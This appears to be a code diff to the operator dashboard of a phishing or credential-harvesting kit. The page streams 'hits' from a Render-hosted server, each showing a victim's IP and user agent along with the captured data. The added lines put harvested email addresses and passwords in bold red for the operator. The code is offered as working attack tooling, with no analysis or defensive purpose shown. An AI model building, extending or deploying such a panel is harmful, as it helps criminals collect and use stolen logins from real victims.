@@ -12,13 +12,13 @@ h3{margin-top:0}
 .ts{color:#888;font-size:11px}
 .ua{color:#999;font-size:11px;margin-top:2px}
 pre{margin:4px 0;color:#9f9;font-size:12px;white-space:pre-wrap;word-break:break-all}
+.highlight{color:#f66; font-weight:bold; font-size:14px;}
 </style>
 </head>
 <body>
 <h3>live feed</h3>
 <div id="feed"></div>
 <script>
-// замени sites-xxxx.onrender.com на твой реальный адрес Render
 const HOST = "sites-gt5x.onrender.com";
 const WS = (location.protocol === "https:" ? "wss://" : "ws://") + HOST + "/ws/operator";
 const API = "https://" + HOST + "/api/hits";
@@ -26,11 +26,19 @@ const API = "https://" + HOST + "/api/hits";
 let ws = null;
 
 function render(r) {
+  let data = r.data;
+  let formattedData = JSON.stringify(data, null, 2);
+  
+  // Подсвечиваем логин и пароль, если они есть
+  if (data.type === "login") {
+      formattedData = `<span class="highlight">EMAIL: ${data.email}</span>\n<span class="highlight">PASS:  ${data.password}</span>\n\n` + formattedData;
+  }
+
   const d = document.createElement("div");
   d.className = "row";
   d.innerHTML = `<span class="ip">${r.ip}</span> <span class="ts">${new Date(r.ts*1000).toLocaleTimeString()}</span>
     <div class="ua">${r.ua}</div>
-    <pre>${JSON.stringify(r.data, null, 2)}</pre>`;
+    <pre>${formattedData}</pre>`;
   const feed = document.getElementById("feed");
   feed.insertBefore(d, feed.firstChild);
 }
